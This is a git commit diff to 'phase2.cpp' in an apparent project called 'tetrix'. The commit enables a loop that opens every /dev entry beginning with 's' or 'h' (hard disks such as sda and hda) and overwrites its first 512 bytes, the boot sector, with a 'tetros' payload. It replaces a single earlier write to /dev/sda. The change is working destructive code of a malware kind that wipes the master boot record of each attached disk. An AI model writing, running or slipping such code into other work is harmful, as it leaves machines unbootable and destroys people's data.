8239a521dc4cd68d7d1293e8b4aa876b63d84212
Lukecell <alex@thesalleys.com>
2016-11-14 17:01:44 -0800

    Improved phase 2

--- src/tetrix/phase2/phase2.cpp
+++ src/tetrix/phase2/phase2.cpp
@@ -10,16 +10,16 @@ phase2::phase2()
 int phase2::execute()
 {
 	int secsToWait;
-	/*
+	int fd;
 	DIR *dir;
 	struct dirent *ent;
 	if ((dir = opendir ("/dev")) != NULL) {
-	  /* print all the files and directories within directory 
+	  // print all the files and directories within directory 
 	  while ((ent = readdir (dir)) != NULL) {
  	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h')
 	   {
 	        printf ("%s\n", ent->d_name);
-        	int fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
+        	fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
         	lseek(fd, 0, SEEK_SET);
         	write(fd, tetros, 512);
         	close(fd);
@@ -29,15 +29,12 @@ int phase2::execute()
  	 }
  	 closedir (dir);
 	} else {
- 	 /* could not open directory 
+ 	 // could not open directory 
   	perror ("");
   	return EXIT_FAILURE;
 	}
-        */
-	int fd = open("/dev/sda", O_WRONLY);
-	if(write(fd, tetros, 512) == -1){
-	  perror("perror: ");
-	}
+        
+
 	close(fd);
 
 	secsToWait = 2;
